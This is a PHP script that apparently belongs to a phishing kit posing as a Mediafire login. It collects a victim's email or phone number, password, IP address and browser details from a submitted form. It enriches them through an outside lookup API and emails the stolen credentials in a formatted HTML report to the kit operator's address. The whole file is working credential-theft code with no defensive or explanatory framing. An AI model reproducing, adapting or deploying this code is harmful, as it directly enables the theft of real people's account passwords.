<?php
date_default_timezone_set("Asia/Jakarta");

function devicemanager($ua){
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, "https://api-xyz.com/system/useragent/?ua=".urlencode($ua)); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
    $exe = curl_exec($ch); 
    curl_close($ch);      

    return json_decode($exe,true);
}

function location($var){
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_URL, "https://api-xyz.com/system/flag/?ip=".$var); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
    $exe = curl_exec($ch); 
    curl_close($ch);      

    return json_decode($exe,true);
}

$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_POST['ip'];
$ua = $_POST['ua'];
$time = date('d-m-Y : h-i-s');

$info = location($ip);
$dev = devicemanager($ua);

$subjek = "Result Mediafire | Punya Si {$user} ";
$pesan = '<center>
 <div style="background: url(https://i.ibb.co/j53Pkb9/Imgku.jpg) no-repeat;border:2px solid white;background-size: 100% 100%; width: 294; height: 101px; color: #996633; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:#996633;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Phone</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>IP</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$ip.'</th> 
</tr>
</table>
<div style="border:2px solid white;width: 294; font-weight:bold; height: 20px; background: #996633; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#3399ff;" href="https://www.facebook.com/nextnesia">FB: Nextnesia Hosting</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#ff0000;" href="https://www.youtube.com/wahyuekaprayogayt">YT:WAhyu Eka Prayoga</a>
</div>
 <center>';
include 'email.php';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
mail($email, $subjek, $pesan, $headers);
?>